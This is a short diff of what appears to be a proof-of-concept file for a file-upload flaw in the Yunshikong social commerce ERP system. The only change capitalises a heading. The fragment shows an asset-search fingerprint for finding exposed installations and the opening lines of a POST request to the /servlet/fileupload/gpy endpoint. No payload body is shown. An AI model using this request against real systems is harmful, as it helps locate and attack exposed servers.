@@ -5,7 +5,7 @@
 app="云时空社会化商业ERP系统"
 ```
 
-## poc
+## POC
 ```
 POST /servlet/fileupload/gpy HTTP/1.1
 Host: ip:8090
